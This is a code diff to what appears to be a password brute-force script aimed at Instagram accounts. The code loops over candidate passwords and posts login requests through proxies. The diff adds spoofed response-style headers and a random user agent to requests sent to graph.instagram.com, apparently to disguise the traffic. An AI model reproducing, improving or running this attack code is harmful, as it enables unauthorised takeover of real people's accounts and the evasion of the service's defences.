@@ -112,10 +112,11 @@ for pss in ps:
             data = {'username': user, 'password': pss, 'uuid':uid, 'from_reg':'false', '_csrftoken': 'missing','login_attempt_countn':'0','submit':'log in'}
             #head = {"scheme": "https","host": "graph.instagram.com","filename": "/logging_client_events","remote": {"Address": ips}, 'X-Frame-Options': 'DENY', 'X-Content-Type-Options': 'nosniff', 'X-XSS-Protection': '0', 'Vary': 'Origin', 'Content-Type': 'application/json; charset=UTF-8', 'WWW-Authenticate': 'OAuth "Facebook Platform" "invalid_request" "Invalid OAuth 2.0 Access Token"', 'Access-Control-Allow-Origin': '*', 'Strict-Transport-Security': 'max-age=15552000', 'Pragma': 'no-cache', 'Cache-Control': 'no-store', 'Expires': 'Sat, 01 Jan 2000 00:00:00 GMT', 'x-fb-request-id': 'AIW8vu6H6AHA7Cyatxu4elN', 'x-fb-trace-id': 'Buw1EXSZ+A4', 'x-fb-rev': '1005818168', 'X-FB-Debug': 'INvVSJKJQLRwye7IcRcym6LNOyjTqOJNUoki8RRdYuznsC5FvT4fzzGk0mYwaTuQBa0N7giOyS1K2f8N+nTNTA==', 'Date': 'Sat, 09 Jul 2022 19:13:17 GMT', 'X-FB-TRIP-ID': '1425083115', 'Connection': 'keep-alive', 'Content-Length': '45'}
             host = 'https://graph.instagram.com'
-            try:
-                req = requests.get(host)
-            except:
-                pass
+            hed = {'Host': host, 'User-Agent': pyuseragents.random(), 'X-Frame-Options': 'DENY', 'X-Content-Type-Options': 'nosniff', 'X-XSS-Protection': '0', 'Vary': 'Origin', 'Content-Type': 'application/json; charset=UTF-8', 'WWW-Authenticate': 'OAuth "Facebook Platform" "invalid_request" "Invalid OAuth 2.0 Access Token"', 'Access-Control-Allow-Origin': '*', 'Strict-Transport-Security': 'max-age=15552000', 'Pragma': 'no-cache', 'Cache-Control': 'no-store', 'Expires': 'Sat, 01 Jan 2000 00:00:00 GMT', 'x-fb-request-id': 'AfEFkZ2G8RvQ8w6a9gFIKXt', 'x-fb-trace-id': 'CAiOl2db1BY', 'x-fb-rev': '1005818210', 'X-FB-Debug': 'fRa2DaGgArwlMQ5xPaM0H4ygWOLc1MbdJ+fNKKQg10Eghb+jCV+nFx3LiXkyJ65dmxm/XiC5wKc8R0yXjGJRgQ==', 'Date': 'Sat, 09 Jul 2022 21:07:37 GMT', 'X-FB-TRIP-ID': '1425083115', 'Connection': 'keep-alive', 'Content-Length': '45'}
+            #try:
+                #req = requests.get(host)
+            #except:
+                #pass
             #try:
                 #token = req.json['access_token']
             #except:
@@ -157,10 +158,10 @@ for pss in ps:
                 except:
                     sys.exit()
             try:
-                requests.post(host, json=the)
+                requests.post(host, headers=hed, json=the)
             except:
                 try:
-                    requests.post(host, json=json)
+                    requests.post(host, headers=hed, json=json)
                 except:
                     pass
             rq = requests.post(server, headers=headers, data=data, proxies=proxi)
